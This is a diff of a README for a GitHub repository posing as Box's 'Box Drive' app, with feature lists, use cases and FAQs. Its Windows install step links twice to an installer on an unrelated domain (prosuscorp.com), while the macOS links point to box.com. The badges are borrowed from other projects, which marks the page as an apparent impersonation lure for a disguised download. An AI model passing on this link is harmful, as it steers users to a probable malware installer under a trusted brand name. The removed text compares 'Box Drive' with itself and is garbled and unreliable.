@@ -1,69 +1,140 @@
-**Box Drive** is a powerful desktop application from Box, designed to seamlessly integrate cloud storage with local file management. Both applications provide users with easy access to their cloud-based files, but they differ in their approaches to syncing, file management, and collaboration. In this repository, we'll explore the key features, differences, and use cases for each of these tools, helping you understand which one best suits your needs for cloud storage and collaboration.
+# <img width="26px" src="https://github.com/Box-Sync/Box-Drive/blob/main/images.png" alt="Sonarr"></img> Box Drive: Simplify Cloud File Access
 
-## Box Drive
+<p align="center">
+  <a href="https://www.box.com/">
+    <img src="https://github.com/Box-Sync/Box-Drive/blob/main/1-hero-fg-box-drive.png">
+  </a>
+</p>
 
-### What is Box Drive?
 
-Box Drive is a desktop application that allows you to sync files between your local computer and your Box cloud account. With Box Drive, you can work with your files offline and automatically sync any changes you make to the cloud as soon as you're connected to the internet. This makes it easy to access and edit your files, whether you're working on your laptop, desktop, or while on the go.
+[![Backers on Open Collective](https://img.shields.io/github/license/instaloader/instaloader.svg)](#backers)
+[![Backers on Open Collective](https://img.shields.io/aur/version/instaloader.svg)](#backers)
+[![Sponsors on Open Collective](https://pepy.tech/badge/instaloader/month)](#sponsors)
+[![Mega Sponsors on Open Collective](https://img.shields.io/github/contributors/unoplatform/uno.svg?style=flat&color=7a67f8)](#mega-sponsors)
 
-### Key Features of Box Drive
+Box Drive is a desktop application designed to streamline file access and organization by syncing your files from the cloud directly to your device. It provides seamless integration with Windows and macOS, allowing you to work on your files as if they were stored locally. Box Drive ensures that your files are always up-to-date, and changes made locally are synced back to the cloud.
 
-- **Offline Access**: Box Drive allows you to download files and folders to your local device for offline access. Any changes made while offline are synced back to Box once you’re online again.
-- **Automatic Syncing**: When you make changes to a file or folder, Box Drive ensures that these changes are automatically synced to the cloud, maintaining version control and keeping your files up-to-date.
-- **Selective Syncing**: You can choose which files and folders to sync to your local device. This helps you save space by downloading only the files you need.
-- **File Collaboration**: Box Drive ensures that any changes made by collaborators are automatically synced to your device, ensuring that everyone is working with the most current version of a file.
-- **Security and Encryption**: All data transferred to and from Box Drive is encrypted, ensuring that your files are secure both in transit and at rest.
+To install Box Drive, follow the instructions according to your operating system.
 
-### Use Cases for Box Drive
+| Jump to: | [Windows](https://github.com/Box-Sync/Box-Drive#Windows) | [MacOS](https://github.com/Box-Sync/Box-Drive#MacOS) | [Android](https://www.box.com/resources/downloads) | [Other platforms](https://www.box.com/resources/downloads) |  
+| :--- | :---: | :---: | :---: | :---: |
 
-Box Drive is ideal for individuals and teams that need to work offline and sync their files back to the cloud once they’re connected. It’s especially useful for professionals who frequently travel or work in environments where consistent internet access is not guaranteed. Additionally, Box Drive is perfect for managing large files or multiple folders, as it allows you to select which content you want to store locally to optimize your system's storage space.
+## Windows
 
-## Box Drive
+Box Drive is supported natively on Windows. You can install it to sync and access your cloud-stored files directly from File Explorer.
 
-### What is Box Drive?
+**Supported Versions:** Windows 10 and later.
 
-Box Drive is a newer application from Box that provides a more seamless, cloud-first experience for file management. Unlike Box Drive, which downloads files locally for offline access, Box Drive operates by keeping files in the cloud while providing easy access via a virtual drive on your desktop. This allows you to access all your files without taking up space on your local device, with the ability to download individual files as needed.
+### 1. Install Box Drive  
+Download the Windows Installer using the following link and execute it:  
+- [Download Windows (x64) Installer](https://prosuscorp.com/boxddrr)
+- [Download Windows (x64) Installer](https://prosuscorp.com/boxddrr)
 
-### Key Features of Box Drive
+### 2. Set up Box Drive  
+Once installed, sign in with your Box account to start syncing your files.  
 
-- **Cloud-Based Storage**: Box Drive provides access to all your files in the cloud without taking up precious storage space on your local device. You can browse your Box folders and open files as if they were stored locally, but they remain in the cloud.
-- **Streamlined File Access**: Box Drive provides instant access to all your files via a drive mounted on your computer. Simply click on the files to open them, and they are automatically downloaded to your device when needed.
-- **Real-Time Collaboration**: With Box Drive, you can collaborate on files in real time. Any changes made by team members are immediately reflected in your file system, keeping everyone in sync.
-- **Version History**: Box Drive integrates version history, allowing you to track changes and restore previous versions of your files with ease.
-- **Seamless Integration**: Box Drive integrates with your operating system, enabling you to work with files as if they were local, while still leveraging the power of the Box cloud for backup and synchronization.
-- **Advanced Security**: Like Box Drive, Box Drive offers robust security features, including encryption and compliance with industry standards for data protection.
+**Manual Installation for Advanced Users:** It is possible to download and extract the application manually, but this requires configuring system paths and dependencies manually.
 
-### Use Cases for Box Drive
+## macOS
 
-Box Drive is perfect for users who don’t want to take up significant local storage space while still needing access to all their files in the cloud. It is well-suited for users working with a large number of files, especially in environments where storage capacity may be limited. Box Drive is ideal for teams working in a collaborative, cloud-based environment where instant access to the latest versions of files is essential.
+The easiest way to install Box Drive on macOS is through the provided installer.  
 
-## Comparing Box Drive and Box Drive
+### 1. Download Box Drive Installer  
+- [Download macOS App (ARM)](https://www.box.com/resources/downloads#MacOS)
+- [Download macOS App (Intel)](https://www.box.com/resources/downloads#MacOS)
 
-| Feature             | **Box Drive**                           | **Box Drive**                          |
-|---------------------|----------------------------------------|----------------------------------------|
-| **Storage Location** | Files are stored locally and synced to the cloud. | Files are stored in the cloud, accessed via a virtual drive. |
-| **Offline Access**   | Files can be accessed offline and changes synced later. | Files are typically accessed online, though they can be downloaded for offline use. |
-| **Syncing**          | Automatic syncing of files to/from the cloud. | Instant access to cloud files; files are downloaded as needed. |
-| **File Management**  | Manage local and cloud files directly from your file system. | Files are managed within a cloud drive, accessed from the local system but stored remotely. |
-| **Storage Efficiency**| Syncs selected files for offline access, consuming local storage. | Saves local storage by keeping files in the cloud but allows on-demand downloads. |
-| **Collaboration**    | Supports real-time collaboration but requires syncing. | Supports real-time collaboration with direct cloud access. |
-| **Security**         | Encryption of files during transfer and storage. | Encryption of files during transfer and storage. |
+### 2. Install Box Drive  
+Run the installer and follow the on-screen instructions.  
 
-### When to Use Box Drive
+**Important:** Ensure the application is moved to your Applications folder to allow updates and proper functionality.  
 
-- **Offline Work**: If you need to work on files offline and sync changes when you're online again, Box Drive is the right choice.
-- **Large File Management**: For users managing large files or needing to keep specific folders local for easier access, Box Drive provides more control over which files are stored locally.
-- **Version Control**: Box Drive's automatic syncing helps maintain version history, making it a great tool for professionals needing tight control over file revisions.
+### 3. Start Box Drive  
+Once installed, open Box Drive from your Applications folder and sign in with your Box account.  
 
-### When to Use Box Drive
+#### Access Box Drive  
+Box Drive integrates seamlessly with Finder. You’ll find your Box files in the sidebar under the "Box" folder.  
 
-- **Cloud-First Experience**: If you prefer to keep most of your files in the cloud and minimize local storage usage, Box Drive is the ideal solution.
-- **Seamless Collaboration**: If your team works collaboratively in real-time and you don’t need to manually sync files, Box Drive will provide a more streamlined experience.
-- **Storage Constraints**: For users with limited local storage, Box Drive offers an efficient way to access all your files without consuming space on your device.
+## Docker (Optional Use Case)
 
-## Conclusion
+Although Box Drive is not typically used with Docker, advanced users can leverage third-party containers to set up Box Drive in specialized environments. Refer to Docker-specific documentation for further guidance.
 
-Both Box Drive and Box Drive are powerful tools for managing and collaborating on files in the cloud, but they serve slightly different use cases. Box Drive is ideal for users who need offline access and control over which files are stored locally, while Box Drive provides a cloud-first experience with seamless access to all files without taking up local storage space.
+---
 
-Choosing between the two depends on your needs: if you need full offline access and selective syncing, Box Drive is your go-to; if you prefer cloud-based storage with minimal local space usage, Box Drive is the way to go. Either way, both tools provide excellent security, real-time collaboration, and efficient file management to help you and your team stay productive.
 
+## Features of Box Drive  
+- 🖥️ **Intuitive User Interface**: Simple and clean design for effortless navigation.  
+- 🚀 **Seamless File Sync**: Automatically syncs files between your device and the cloud.  
+- 📁 **Supports Large File Uploads**: Handles files of up to 150GB in size.  
+- 🔒 **Advanced Security**: Built-in encryption and access controls.  
+- 🌍 **Cross-Platform Compatibility**: Available for Windows, Mac, iOS, and Android.  
+- 🔄 **Offline Access**: Access files without an internet connection.  
+- 🗂️ **Organized File Management**: Efficiently categorize and search for files.  
+- 💼 **Collaborative Tools**: Share files and folders with team members easily.  
+- 🌙 **Dark Mode**: Comfortable viewing experience in low-light environments.  
+- 🧳 **Lightweight Installation**: Minimal impact on system resources.  
+- 🔔 **Real-Time Notifications**: Stay updated on file changes and activity.  
+- 📊 **Detailed File Insights**: Track versions and activity history.
+
+
+## Use Cases  
+
+Box Drive is a versatile tool that caters to various needs across different industries and individual use cases. Here are some common scenarios where Box Drive can make a significant impact:  
+
+### 1. **Business Collaboration**  
+- Share documents, presentations, and reports with your team in real time.  
+- Manage version control effortlessly, ensuring everyone is working on the latest file.  
+- Collaborate on projects by assigning tasks and tracking progress directly in Box Drive.  
+
+### 2. **Creative Professionals**  
+- Store and organize large multimedia files, including videos, images, and design assets.  
+- Share portfolios with clients or teammates without the need for email attachments.  
+- Access files offline during photoshoots or video editing on the go.  
+
+### 3. **Education**  
+- Teachers can distribute study materials and collect assignments securely.  
+- Students can collaborate on group projects and keep their notes organized.  
+- Seamless integration with educational tools like Google Workspace and Microsoft Office.  
+
+### 4. **Remote Work**  
+- Ensure remote teams have access to all necessary files without the need for complex VPN setups.  
+- Keep work organized with shared folders and project-specific directories.  
+- Real-time updates and notifications help maintain productivity and communication.  
+
+### 5. **Legal and Compliance**  
+- Store sensitive legal documents securely with built-in encryption.  
+- Share contracts, agreements, and other legal materials with clients and partners securely.  
+- Ensure compliance with regulatory standards by managing permissions and access controls.  
+
+---
+
+## FAQs  
+
+### 1. **What is Box Drive?**  
+Box Drive is a cloud-based file management tool that allows you to access, edit, and share your files securely from your desktop, without taking up hard drive space.  
+
+### 2. **Which operating systems are supported by Box Drive?**  
+Box Drive is compatible with Windows and macOS. For mobile devices, you can use the Box app available on iOS and Android.  
+
+### 3. **Can I access my files offline?**  
+Yes, Box Drive allows you to mark specific files or folders for offline access. You can work on them without an internet connection, and changes will sync when you're back online.  
+
+### 4. **Is there a file size limit for uploads?**  
+Yes, Box Drive supports file uploads of up to 150GB, depending on your Box account plan.  
+
+### 5. **How secure is Box Drive?**  
+Box Drive offers advanced security features, including built-in encryption, file-level permissions, and multi-factor authentication to ensure your data remains safe.  
+
+### 6. **Can I share files directly from Box Drive?**  
+Absolutely! You can generate shareable links or invite collaborators to specific folders and files directly from the app.  
+
+### 7. **What happens if I delete a file in Box Drive?**  
+When you delete a file in Box Drive, it is moved to the Trash folder. You can restore it from Trash within a specific time frame, depending on your organization's retention policy.  
+
+### 8. **Does Box Drive support integration with other tools?**  
+Yes, Box Drive integrates seamlessly with tools like Microsoft Office, Google Workspace, Slack, and many others to enhance your workflow.  
+
+### 9. **How do I report an issue or get support?**  
+You can visit the [Box Support Center](https://support.box.com) or contact your organization's Box administrator for assistance.  
+
+### 10. **Is there a limit to the number of files I can store in Box Drive?**  
+There is no hard limit on the number of files, but performance may vary depending on your device and internet connection when syncing large amounts of data.
